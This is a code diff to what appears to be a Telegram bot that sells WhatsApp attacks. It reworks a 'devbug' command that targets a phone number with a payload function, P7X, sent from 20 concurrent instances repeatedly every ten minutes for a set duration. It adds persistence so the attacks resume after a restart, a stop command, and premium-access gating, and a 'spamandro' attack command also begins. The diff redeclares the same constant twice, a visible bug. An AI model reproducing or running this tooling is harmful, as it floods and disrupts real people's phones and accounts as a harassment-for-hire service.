@@ -2378,41 +2378,151 @@ been successfully analyzed.
 });
 
 // ==========================================
-// ALL BUG COMMAND
+// DEVELOPER BUG
 // ==========================================
 
 const activeDurationTasks = new Map();
+const TASK_FILE = "./database/durationTasks.json";
+const activeDurationTasks = new Map();
+if (!fs.existsSync("./database")) {
+    fs.mkdirSync("./database");
+}
+
+if (!fs.existsSync(TASK_FILE)) {
+    fs.writeFileSync(
+        TASK_FILE,
+        JSON.stringify([])
+    );
+}
+
+function saveTasks() {
+    const data =
+        [...activeDurationTasks.values()]
+        .map(task => ({
+
+            taskId: task.taskId,
+            target: task.target,
+            duration: task.duration,
+            started: task.started,
+            nextRun: task.nextRun
+
+        }));
+
+    fs.writeFileSync(
+        TASK_FILE,
+        JSON.stringify(data, null, 2)
+    );
+}
 
 function parseDuration(duration) {
-
+    
     const match =
         duration.match(/^(\d+)(d|h|m)$/);
-
+    
     if (!match) return null;
-
+    
     const value =
         parseInt(match[1]);
-
+    
     const unit =
         match[2];
-
+    
     switch (unit) {
-
+        
         case "d":
-            return value * 24 * 60 * 60 * 1000;
-
+            return value *
+                24 *
+                60 *
+                60 *
+                1000;
+            
         case "h":
-            return value * 60 * 60 * 1000;
-
+            return value *
+                60 *
+                60 *
+                1000;
+            
         case "m":
-            return value * 60 * 1000;
-
+            return value *
+                60 *
+                1000;
+            
         default:
             return null;
     }
 }
 
-bot.command('devbug', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
+async function runDurationTask(task) {
+
+    if (task.interval) {
+        clearInterval(task.interval);
+    }
+
+    const executeAttack =async () => {
+
+        console.log(`[TASK ${task.taskId}] EXECUTING`);
+
+        const createInstance = async (instanceIndex) => {
+
+            const instanceId =
+                `${task.taskId}-${instanceIndex}`;
+
+            try {
+                for (let i = 0;i < 20;i++) {
+                    try {
+                        if (!sock) {
+                            throw new Error("Socket unavailable");
+                        }
+                        await P7X(sock, task.target);
+                        await sleep(3000);
+                        console.log(
+                            `[INSTANCE ${instanceId}] EXEC ${i + 1}`
+                        );
+                    } catch (e) {
+                        console.log(`[INSTANCE ${instanceId}] ${e.message}`);
+                        autoRestartOn408(e);
+                    }
+                }
+            } catch (err) {
+                console.log(`[INSTANCE ${instanceId}] FAILED`);
+            }
+        };
+
+        const allInstances = Array.from({ length: 20 }, (_, i) => createInstance(i + 1));
+
+        await Promise.allSettled(allInstances);
+
+        task.nextRun = Date.now() + (10 * 60 * 1000);
+
+        saveTasks();
+
+        console.log(`[TASK ${task.taskId}] COMPLETE`);
+    };
+
+    executeAttack();
+    task.interval = setInterval(executeAttack, 10 * 60 * 1000);
+    activeDurationTasks.set(task.taskId, task);
+    saveTasks();
+}
+
+async function restoreTasks() {
+    try {
+        const raw = fs.readFileSync(TASK_FILE);
+        const tasks = JSON.parse(raw);
+        
+        for (const task of tasks) {
+            console.log(`[RESTORE TASK] ${task.taskId}`);
+            await runDurationTask(task);
+        }
+
+    } catch (err) {
+        console.log(`[RESTORE ERROR] ${err.message}`);
+    }
+}
+
+restoreTasks();
+
+bot.command("stoptask", async (ctx) => {
     
     if (ctx.from.id != ownerID) {
         return ctx.reply(
@@ -2422,156 +2532,98 @@ This command is restricted to the system owner.`
         );
     }
     
-        let args = ctx.message?.text?.split(" ");
-        let q = args[1];
-        let durationArg = args[2] || "1d";
-        if (!q) {
-            return ctx.reply(
-`Invalid Format
+        const id = ctx.message.text.split(" ")[1];
 
-Usage:
-/devbug <target> <duration>
-
-Example:
-/devbug 628xxx 1d
-/devbug 628xxx 12h`
-            );
+        if (!id) {
+            return ctx.reply("Usage: /stoptask <id>");
         }
 
-        const durationMs = parseDuration(durationArg);
+        const task =activeDurationTasks.get(id);
 
-        if (!durationMs) {
-            return ctx.reply("Invalid duration format.");
-            
+        if (!task) {
+            return ctx.reply("Task not found.");
         }
 
-        let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-        const taskId = Date.now().toString();
-        const endTime = Date.now() + durationMs;
-
-        try {
-            const sent =
-                await ctx.replyWithPhoto(
-                    thumbnailUrl,
-                    {
-                        caption:
-`
-<pre>
-V O G U E  •  DURATION BUG
-──────────────────────────
-
-Target      : ${q}
-Duration    : ${durationArg}
-Status      : Running
-
-──────────────────────────
-Background task initialized.
-</pre>
-`,
-                        parse_mode: "HTML"
-                    }
-                );
-
-            const interval = setInterval(async () => {
-                    if (
-                        Date.now() >= endTime
-                    ) {
-                        clearInterval(interval);
-                        activeDurationTasks.delete(taskId);
-                        try {
-                            await ctx.telegram.editMessageCaption(
-                                ctx.chat.id,
-                                sent.message_id,
-                                undefined,
-
-`
-<pre>
-V O G U E  •  DURATION BUG
-──────────────────────────
-
-Target      : ${q}
-Duration    : ${durationArg}
-Status      : Finished
-
-──────────────────────────
-Task duration completed.
-</pre>
-`,
-                                {
-                                    parse_mode: "HTML"
-                                }
-                            );
-                        } catch {}
-                        return;
-                    }
-                    const createInstance = async (instanceIndex) => {
-                        const instanceId = `${taskId}-${instanceIndex}`;
-                        try {
-                            for (let i = 0; i < 20; i++) {
-                                try {
-                                    if (!sock) {
-                                        throw new Error("Socket unavailable");
-                                    }
-                                    
-                                    await P7X(sock, target);
-                                    await sleep(3000);
-
-                                    console.log(`[INSTANCE ${instanceId}] EXEC ${i + 1}`);
-                                } catch (e) {
-                                    console.log(`[INSTANCE ${instanceId}] ERROR ${e.message}`);
-                                    autoRestartOn408(e);
-                                }
-                            }
-                        } catch (err) {
-                            console.log(`[INSTANCE ${instanceId}] FAILED`);
-                        }
-                    };
-
-                    const allInstances = Array.from({ length: 20 }, (_, i) =>
-                                createInstance(i + 1)
-                        );
-
-                    await Promise.allSettled(allInstances);
-
-                    console.log(`[TASK ${taskId}] CYCLE COMPLETED`);
-                }, 10 * 60 * 1000);
-
-            (async () => {
-
-                const allInstances =Array.from({ length: 20 }, (_, i) => {
-
-                            const instanceId = `${taskId}-${i + 1}`;
-                            return (async () => {
-                                for (let x = 0; x < 20; x++) {
-                                    try {
-                                        await P7X(sock, target);
-                                        await sleep(3000);
-                                    } catch (e) {
-                                        autoRestartOn408(e);
-                                    }
-                                }
-                                console.log(`[INSTANCE ${instanceId}] FIRST EXEC DONE`);
-                            })();
-                        }
-                    );
-                await Promise.allSettled(allInstances);
-            })();
-            activeDurationTasks.set(
-                taskId,
-                {
-                    target: q,
-                    duration: durationArg,
-                    started: Date.now(),
-                    endTime,
-                    interval
-                }
-            );
-        } catch (err) {
-            console.log(err);
-            ctx.reply("Failed to initialize duration task.");
-        }
+        clearInterval(task.interval);
+        activeDurationTasks.delete(id);
+        saveTasks();
+        ctx.reply(`Task ${id} stopped.`);
     }
 );
+
+bot.command("devbug", checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
+    
+    if (ctx.from.id != ownerID) {
+        return ctx.reply(
+`Access Denied
+
+This command is restricted to the system owner.`
+        );
+    }
+    
+        const args = ctx.message.text.split(" ");
+        const q = args[1];
+        const durationArg = args[2];
+        
+        if (!q || !durationArg) {
+            
+            return ctx.reply(`Usage:
+/devbug 628xxx 1d`);
+        }
+        
+        const durationMs = parseDuration(durationArg);
+        
+        if (!durationMs) {
+            return ctx.reply("Invalid duration.");
+        }
+        
+        const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+        
+        const taskId = Date.now().toString();
+        
+        const task = {
+            taskId,
+            target,
+            duration: durationArg,
+            started: Date.now(),
+            nextRun: Date.now()
+        };
+        
+        activeDurationTasks.set(
+            taskId,
+            task
+        );
+        
+        saveTasks();
+        
+        await runDurationTask(task);
+        
+        ctx.reply(
+            `
+<pre>
+V O G U E • DURATION BUG
+──────────────────────
+
+Task ID   : ${taskId}
+Target    : ${q}
+Duration  : ${durationArg}
+
+Status    : RUNNING
+
+──────────────────────
+Persistent task created. Task will survive restart.
+</pre>
+`,
+            {
+                parse_mode: "HTML"
+            }
+        );
+    }
+);
+
+// ==========================================
+// ALL BUG CMD
+// ==========================================
 
 bot.command('spamandro', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
     
